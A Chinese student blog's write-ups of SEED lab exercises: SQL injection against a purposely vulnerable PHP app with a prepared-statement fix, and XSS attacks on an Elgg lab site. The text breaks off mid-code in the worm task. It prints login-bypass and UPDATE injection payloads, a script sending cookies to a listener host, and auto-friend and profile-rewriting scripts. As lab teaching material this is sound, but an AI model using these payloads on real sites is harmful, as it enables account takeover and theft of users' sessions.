    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-8-Sql注入实验"><a href="#Lab-8-Sql注入实验" class="headerlink" title="Lab 8-Sql注入实验"></a>Lab 8-Sql注入实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>SQL注入是一种代码注入技术，它利用web应用程序和数据库服务器之间接口中的漏洞。当用户的输入在发送到后端数据库服务器之前未在web应用程序中正确检查时，就会出现此漏洞。许多web应用程序从用户处获取输入，然后使用这些输入构造SQL查询，这样web应用程序就可以从数据库中获取信息。Web应用程序还使用SQL查询在数据库中存储信息。这些是web应用程序开发中的常见做法。如果未仔细构造SQL查询，则可能会出现SQL注入漏洞。SQL注入攻击是对web应用程序最常见的攻击之一。</p><p>在本实验室中，我们创建了一个易受SQL注入攻击的web应用程序。我们的web应用程序包含许多web开发人员所犯的常见错误。学生的目标是找到利用SQL注入漏洞的方法，演示攻击可能造成的损害，并掌握有助于抵御此类攻击的技术。</p><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><ol><li><p>修改<code>image_www/apache_sql_injection.conf</code>文件，将<a href="http://www.seedlabsqlinjection.com的url修改进去/">www.seedlabsqlinjection.com的url修改进去</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219011629044.png" alt="image-20241219011629044"></p></li><li><p>创建docker镜像</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219011008326.png" alt="image-20241219011008326"></p><p>镜像创建完成</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219011055757.png" alt="image-20241219011055757"></p></li><li><p>启动容器</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219011207287.png" alt="image-20241219011207287"></p></li><li><p>访问<a href="http://www.seedlabsqlinjection.com,得到页面/">www.seedlabsqlinjection.com，得到页面</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219011910731.png" alt="image-20241219011910731"></p></li></ol><hr><h4 id="Task-1-Get-Familiar-with-SQL-Statements"><a href="#Task-1-Get-Familiar-with-SQL-Statements" class="headerlink" title="Task 1: Get Familiar with SQL Statements"></a>Task 1: Get Familiar with SQL Statements</h4><ol><li><p>作业中给了seedubuntu用户下的User用户表</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219012339802.png" alt="image-20241219012339802"></p></li><li><p>进入docker创建的mysql容器当中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219013359069.png" alt="image-20241219013359069"></p></li><li><p>使用root用户，dees密码进入mysql当中</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219013443935.png" alt="image-20241219013443935"></p></li><li><p>看一下mysql的数据库</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219013523901.png" alt="image-20241219013523901"></p><p>果然有作业中写到的sqllab_users数据库</p></li><li><p>看一下sqllab_users数据库的表</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219013715656.png" alt="image-20241219013715656"></p><p>确实得到了作业中所写到的这些字段</p></li><li><p>使用sql语句将Alice的信息筛选出来</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219013944273.png" alt="image-20241219013944273"></p><p>连加密的密码都可以得到</p><p>可以尝试解密一下，得到密码为SHA-1加密，原文为’seedalice’</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219014320400.png" alt="image-20241219014320400"></p></li></ol><hr><h4 id="Task-2-SQL-Injection-Attack-on-SELECT-Statement"><a href="#Task-2-SQL-Injection-Attack-on-SELECT-Statement" class="headerlink" title="Task 2: SQL Injection Attack on SELECT Statement"></a>Task 2: SQL Injection Attack on SELECT Statement</h4><h5 id="Task-2-1-SQL-Injection-Attack-from-webpage"><a href="#Task-2-1-SQL-Injection-Attack-from-webpage" class="headerlink" title="Task 2.1: SQL Injection Attack from webpage."></a>Task 2.1: SQL Injection Attack from webpage.</h5><ol><li><p>观察<code>image_www/code/unsafe_home.php</code>文件，可以看到home登录时的sql查询语句</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219015525063.png" alt="image-20241219015525063"></p><p>可以直接用’将后面password的校验给过滤掉，再使用#传入password</p></li><li><p>所以在前端输入admin’;#</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219015715439.png" alt="image-20241219015715439"></p><p>成功登入admin账号</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219015740331.png" alt="image-20241219015740331"></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h5 id="Task-2-2-SQL-Injection-Attack-from-command-line"><a href="#Task-2-2-SQL-Injection-Attack-from-command-line" class="headerlink" title="Task 2.2: SQL Injection Attack from command line."></a>Task 2.2: SQL Injection Attack from command line.</h5><ol><li><p>观察登入进去的url</p><p><a href="http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin%27;%23&Password=">http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin%27%3B%23&amp;Password=</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219020053107.png" alt="image-20241219020053107"></p></li><li><p>直接使用<code>curl http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin%27%3B%23&amp;Password=</code>命令，在终端中访问这个url，就能得到页面的内容，其中%27%3B%23即为<code>&#39;;#</code>被URL编码过后的结果（%27、%23也是ASCII编码）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219020900842.png" alt="image-20241219020900842"></p><p>尤其表格中的内容：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219021124839.png" alt="image-20241219021124839"></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h5 id="Task-2-3-Append-a-new-SQL-statement"><a href="#Task-2-3-Append-a-new-SQL-statement" class="headerlink" title="Task 2.3: Append a new SQL statement."></a>Task 2.3: Append a new SQL statement.</h5><ol><li><p>作业中提到想要直接在页面中使用两个sql语句来修改数据库的值</p><p>于是尝试使用admin账号来将Alice的名字改成AAA</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">admin&#x27;;update credential set Name=&#x27;AAA&#x27; where Name=&#x27;Alice&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219021838963.png" alt="image-20241219021838963"></p></li><li><p>报错了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219021858310.png" alt="image-20241219021858310"></p></li><li><p>是因为<code>unsafe_home.php</code>文件中的<code>query()</code>函数禁用很多语句</p></li></ol><p><strong>sql注入攻击失败！</strong></p><hr><h4 id="Task-3-SQL-Injection-Attack-on-UPDATE-Statement"><a href="#Task-3-SQL-Injection-Attack-on-UPDATE-Statement" class="headerlink" title="Task 3: SQL Injection Attack on UPDATE Statement"></a>Task 3: SQL Injection Attack on UPDATE Statement</h4><h5 id="Task-3-1-Modify-your-own-salary"><a href="#Task-3-1-Modify-your-own-salary" class="headerlink" title="Task 3.1: Modify your own salary."></a>Task 3.1: Modify your own salary.</h5><ol><li><p>alice登录自己的账户</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219022830771.png" alt="image-20241219022830771"></p></li><li><p>使用编辑个人信息的方式进行注入，将工资改成999999</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;,Salary=&#x27;999999<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219023209473.png" alt="image-20241219023209473"></p></li><li><p>修改成功</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219023237087.png" alt="image-20241219023237087"></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h5 id="Task-3-2-Modify-other-people’-salary"><a href="#Task-3-2-Modify-other-people’-salary" class="headerlink" title="Task 3.2: Modify other people’ salary."></a>Task 3.2: Modify other people’ salary.</h5><ol><li><p>输入以下语句进行注入，将Boby的工资设为1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;, Salary=1 where Name=&#x27;Boby&#x27;;#<br></code></pre></td></tr></table></figure></li><li><p>前端输入</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219023602683.png" alt="image-20241219023602683"></p></li><li><p>进入admin，发现确实更改了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219023712034.png" alt="image-20241219023712034"></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h5 id="Task-3-3-Modify-other-people’-password"><a href="#Task-3-3-Modify-other-people’-password" class="headerlink" title="Task 3.3: Modify other people’ password."></a>Task 3.3: Modify other people’ password.</h5><ol><li><p>前面用反查发现加密是用的SHA-1进行加密的，如果想更改Boby密码为自己知道的，比如<code>aliceknows</code>，先去加密一下（得到<code>914a6faa2497ebdd583e0b046c587f87af6561c0</code>）</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219031002380.png" alt="image-20241219031002380"></p></li><li><p>然后注入以下语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;,Password=&#x27;914a6faa2497ebdd583e0b046c587f87af6561c0&#x27; where Name=&#x27;Boby&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219031050943.png" alt="image-20241219031050943"></p></li><li><p>登录Boby，使用密码<code>aliceknows</code>，成功登录</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219031203142.png" alt="image-20241219031203142"></p></li></ol><p><strong>sql注入攻击成功！</strong></p><hr><h4 id="Task-4-Countermeasure-—-Prepared-Statement"><a href="#Task-4-Countermeasure-—-Prepared-Statement" class="headerlink" title="Task 4: Countermeasure — Prepared Statement"></a>Task 4: Countermeasure — Prepared Statement</h4><ol><li><p>这项任务是需要创建出<code>safe_home.php</code>，将sql语句与数据分离，防止SQL注入攻击</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219032437772.png" alt="image-20241219032437772"></p></li><li><p>首先复制<code>unsafe_home.php</code>文件，存为<code>safe_home.php</code>文件</p><p>修改上一点中的语句，改为将sql参数与查询分离的语句</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219032543669.png" alt="image-20241219032543669"></p></li><li><p>将<code>index.html</code>中指向的<code>unsafe_home.php</code>，改为<code>safe_home.php</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219032724922.png" alt="image-20241219032724922"></p></li><li><p>重新启动容器</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219032935845.png" alt="image-20241219032935845"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219032950596.png" alt="image-20241219032950596"></p></li><li><p>再次尝试直接登录admin用户</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219032833982.png" alt="image-20241219032833982"></p></li><li><p>首先url中已经指向<code>safe_home.php</code>，然后发现SQL注入失败，说明防护成功了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219042145306.png" alt="image-20241219042145306"></p></li></ol><p><strong>sql注入攻击失败！</strong></p><hr><ol><li><p>修改<code>safe_home.php</code>中的语句，将指向<code>unsafe_home.php</code>的修改为<code>safe_home.php</code>，以及指向<code>unsafe_edit_frontend.php</code>的修改为<code>safe_edit_frontend.php</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219050413882.png" alt="image-20241219050413882"></p></li><li><p>复制<code>unsafe_edit_backend.php</code>为<code>safe_edit_backend.php</code>，并将文件中最后指向的<code>unsafe_home.php</code>改为<code>safe_home.php</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219043019105.png" alt="image-20241219043019105"></p></li><li><p>复制<code>unsafe_edit_frontend.php</code>为<code>safe_edit_frontend.php</code>，并将文件中指向的<code>unsafe_home.php</code>改为<code>safe_home.php</code>，<code>unsafe_edit_frontend.php</code>改为<code>safe_edit_frontend.php</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219043247741.png" alt="image-20241219043247741"></p><p>以及<code>unsafe_edit_backend.php</code>改为<code>safe_edit_backend.php</code></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219043626365.png" alt="image-20241219043626365"></p></li><li><p>以下是<code>safe_edit_backend.php</code>中的查询语句，这个查询将参数与数据的语句嵌在一起了</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219044924346.png" alt="image-20241219044924346"></p><p>修改成以下语句，将查询将参数与数据的语句分离</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219045343500.png" alt="image-20241219045343500"></p></li><li><p>重新docker-compose build</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219045715040.png" alt="image-20241219045715040"></p><p>重新docker-composer up</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219045738937.png" alt="image-20241219045738937"></p></li><li><p>重新登录，显示Alice的工资仍然为999999</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219051506590.png" alt="image-20241219051506590"></p></li><li><p>修改Alice的个人信息，首先确认指向为<code>safe_edit_frontend.php</code>，然后尝试使用SQL注入将Alice的工资改为39999</p><p>尝试sql注入，改变工资为39999</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;,Salary=&#x27;39999<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219050709150.png" alt="image-20241219050709150"></p></li><li><p>发现NickName返回了<code>&#39;,Salary=&#39;39999</code>，工资未变</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241219051644327.png" alt="image-20241219051644327"></p></li></ol><p><strong>sql注入攻击失败！</strong></p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 7</title>
    <link href="/2024/12/25/lab7/"/>
    <url>/2024/12/25/lab7/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-7-XSS攻击实验-Elgg"><a href="#Lab-7-XSS攻击实验-Elgg" class="headerlink" title="Lab 7-XSS攻击实验(Elgg)"></a>Lab 7-XSS攻击实验(Elgg)</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>跨站点脚本(XSS)是一种常见于web应用程序中的计算机安全漏洞。此漏洞使攻击者有可能将恶意代码（如JavaScripts）注入受害者的web浏览器。</p><p>为了演示攻击者可以做什么，我们在预先构建的Ubuntu VM映像中设置了一个名为Elgg的web应用程序。我们已经注释掉了Elgg的一些保护方法，故意使其容易受到XSS攻击。学生们需要利用这些漏洞发动攻击，就像Samy Kamkar在2005年通过臭名昭著的Samy蠕虫对MySpace所做的那样。此攻击的最终目标是在用户之间传播XSS蠕虫，这样无论谁查看受感染的用户配置文件都会受到感染，无论谁受感染都会将您（即攻击者）添加到他&#x2F;她的好友列表中。</p><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="DNS-Setup"><a href="#DNS-Setup" class="headerlink" title="DNS Setup"></a>DNS Setup</h4><ol><li><p>加载docker：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127153646558.png" alt="image-20241127153646558"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127153840653.png" alt="image-20241127153840653"></p></li><li><p>docker-compose build</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127153920827.png" alt="image-20241127153920827"></p></li><li><p>docker-compose up</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127154107107.png" alt="image-20241127154107107"></p></li><li><p>配置&#x2F;etc&#x2F;hosts，添加<a href="http://www.seed-server.com和一些测试网站的域名映射：">www.seed-server.com和一些测试网站的域名映射：</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127192906209.png" alt="image-20241127192906209"></p></li><li><p>可以打开<a href="http://www.seed-server.com了/">www.seed-server.com了</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127154423721.png" alt="image-20241127154423721"></p></li></ol><hr><h4 id="Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window"><a href="#Task-1-Posting-a-Malicious-Message-to-Display-an-Alert-Window" class="headerlink" title="Task 1: Posting a Malicious Message to Display an Alert Window"></a>Task 1: Posting a Malicious Message to Display an Alert Window</h4><ol><li><p>以samy的身份登入网站，修改samy的profile，将攻击代码藏入简介中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127160324941.png" alt="image-20241127160324941"></p></li><li><p>保存后就能看到弹窗：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127160356378.png" alt="image-20241127160356378"></p></li><li><p>返回主页也能看到：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127160419924.png" alt="image-20241127160419924"></p></li></ol><p><strong>攻击成功了！</strong></p><hr><h4 id="Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><a href="#Task-2-Posting-a-Malicious-Message-to-Display-Cookies" class="headerlink" title="Task 2: Posting a Malicious Message to Display Cookies"></a>Task 2: Posting a Malicious Message to Display Cookies</h4><ol><li><p>修改samy中藏有的恶意代码，使其弹窗中显示cookie：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127161134029.png" alt="image-20241127161134029"></p></li><li><p>保存后弹窗中显示cookie：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127161235460.png" alt="image-20241127161235460"></p></li></ol><hr><h4 id="Task-3-Stealing-Cookies-from-the-Victim’s-Machine"><a href="#Task-3-Stealing-Cookies-from-the-Victim’s-Machine" class="headerlink" title="Task 3: Stealing Cookies from the Victim’s Machine"></a>Task 3: Stealing Cookies from the Victim’s Machine</h4><ol><li><p>开启一个终端监听5555端口：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127161551625.png" alt="image-20241127161551625"></p></li><li><p>将samy的profile中的恶意代码修改成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=http://10.9.0.1:5555?c=&#x27;</span>+<span class="hljs-built_in">escape</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)+<span class="hljs-string">&#x27;&gt;&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127161748712.png" alt="image-20241127161748712"></p></li><li><p>保存后发现被拦截了，监听端口输出cookie：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127161903640.png" alt="image-20241127161903640"></p></li></ol><hr><h4 id="Task-4-Becoming-the-Victim’s-Friend"><a href="#Task-4-Becoming-the-Victim’s-Friend" class="headerlink" title="Task 4: Becoming the Victim’s Friend"></a>Task 4: Becoming the Victim’s Friend</h4><ol><li><p>samy添加一个好友，使用wireshark查看一下http的请求是怎么构建的：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127163905808.png" alt="image-20241127163905808"></p><p>得到其中的url请求是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.seed-server.com/action/friends/add?friend=58&amp;__elgg_ts=1732696624&amp;__elgg_token=xLbDvLGeMUw2G9wHHeMT5Q&amp;__elgg_ts=1732696624&amp;__elgg_token=xLbDvLGeMUw2G9wHHeMT5Q<br></code></pre></td></tr></table></figure><p>所以如果要加samy为好友，其id为59，则构造的url请求应该是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.seed-server.com/action/friends/add<span class="hljs-string">&quot;+&quot;</span>?friend=59<span class="hljs-string">&quot; + ts + token + ts + token</span><br></code></pre></td></tr></table></figure><p>所以构造的恶意代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span> +</span><br><span class="language-javascript">            ts + token + ts + token;</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);</span><br><span class="language-javascript">        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>修改samy profile中的恶意代码：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127173421695.png" alt="image-20241127173421695"></p></li><li><p>更换Alice的账号登录，没有好友：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127173614682.png" alt="image-20241127173614682"></p></li><li><p>访问samy的主页，然后发现就添加上了好友：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127173635881.png" alt="image-20241127173635881"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127173655858.png" alt="image-20241127173655858"></p></li></ol><hr><h4 id="Task-5-Modifying-the-Victim’s-Profile"><a href="#Task-5-Modifying-the-Victim’s-Profile" class="headerlink" title="Task 5: Modifying the Victim’s Profile"></a>Task 5: Modifying the Victim’s Profile</h4><ol><li><p>修改一下samy自己的profile：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127175202156.png" alt="image-20241127175202156"></p></li><li><p>抓包之后显示url请求为：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127181759890.png" alt="image-20241127181759890"></p><p>如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">__elgg_token=CL1-xOOBucqcKcYnoGR1Sg&amp;__elgg_ts=1732702506&amp;name=Samy&amp;description=&lt;p&gt;This is samy.&lt;/p&gt; &amp;accesslevel[description]=2&amp;briefdescription=&amp;accesslevel[briefdescription]=2&amp;location=&amp;accesslevel[location]=2&amp;interests=&amp;accesslevel[interests]=2&amp;skills=&amp;accesslevel[skills]=2&amp;contactemail=&amp;accesslevel[contactemail]=2&amp;phone=&amp;accesslevel[phone]=2&amp;mobile=&amp;accesslevel[mobile]=2&amp;website=&amp;accesslevel[website]=2&amp;twitter=&amp;accesslevel[twitter]=2&amp;guid=59<br></code></pre></td></tr></table></figure><p>所以得到了构造的恶意代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>    window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span>()&#123;<br>        var userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.session.user.name;<br>        var guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.session.user.guid;<br>        var ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.security.token.__elgg_ts;<br>        var token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.security.token.__elgg_token;<br>        <br>        var content=token + ts + userName + <span class="hljs-string">&quot;&amp;description=&lt;p&gt;This is from samy.&lt;/p&gt;&amp;accesslevel[description]=2&quot;</span>+guid;<br>        var samyGuid=59;<br>        var sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.session.user.guid!=samyGuid)<br>        &#123;<br>            var Ajax=null;<br>            Ajax=new XMLHttpRequest();<br>            Ajax.open(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>            Ajax.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            Ajax.send(content);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure></li><li><p>修改samy的profile中的恶意代码如下：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127183629147.png" alt="image-20241127183629147"></p></li><li><p>alice登录后，访问samy的主页也会修改</p><p>before：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127182425593.png" alt="image-20241127182425593"></p><p>访问samy后：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127183854635.png" alt="image-20241127183854635"></p></li></ol><p><strong>攻击成功了！</strong></p><hr><h4 id="Task-6-Writing-a-Self-Propagating-XSS-Worm"><a href="#Task-6-Writing-a-Self-Propagating-XSS-Worm" class="headerlink" title="Task 6: Writing a Self-Propagating XSS Worm"></a>Task 6: Writing a Self-Propagating XSS Worm</h4><h5 id="Link-Approach"><a href="#Link-Approach" class="headerlink" title="Link Approach"></a>Link Approach</h5><ol><li><p>使用之前搭建好的<a href="http://www.example32.com作为第三方服务器：">www.example32.com作为第三方服务器：</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127184919618.png" alt="image-20241127184919618"></p></li><li><p>进入apache2中的配置文件，插入<a href="http://www.example32.com的服务器名字：">www.example32.com的服务器名字：</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127185829870.png" alt="image-20241127185829870"></p></li><li><p>在容器中的<code>/var/www/csp</code>文件夹中，创建<code>xssworm.js</code>文件，将上个task中js代码中的内容复制进来，加上wormCode变量，注意使用的域名：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127193216152.png" alt="image-20241127193216152"></p></li><li><p>访问<a href="http://www.example70.com/xssworm.js%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E5%88%B0js%E4%BB%A3%E7%A0%81%EF%BC%9A">www.example70.com/xssworm.js可以访问到js代码：</a></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241127193242363.png" alt="image-20241127193242363"></p></li><li><p>将samy中profile的恶意代码改成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script  type=<span 